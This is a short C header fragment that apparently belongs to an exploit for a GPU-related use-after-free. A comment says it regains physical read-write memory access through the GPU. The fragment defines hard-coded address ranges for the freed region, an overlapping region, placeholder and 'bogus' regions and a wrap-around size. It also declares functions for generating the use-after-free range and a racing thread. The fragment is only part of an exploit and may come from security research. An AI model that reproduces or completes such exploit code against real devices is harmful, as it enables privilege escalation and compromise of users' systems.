// we regain physical RW via gpu to this 256MB region:
#define UAF_START      0x00000007001ff000ULL
#define UAF_SIZE       0x0000000010004000ULL

#define OVERLAP_START  0x00000007001fe000ULL
#define OVERLAP_SIZE   0x0000000000007000ULL
#define PLACEH_START   0x0000000710204000ULL
#define PLACEH_SIZE    0x0000000000010000ULL
#define BOGUS_START    0x0000000700204000ULL
#define WRAP_SIZE      0xffffffffffefd000ULL

int generate_uaf_range();
void cleanup_uaf();
void *bogus_racer(void *arg);
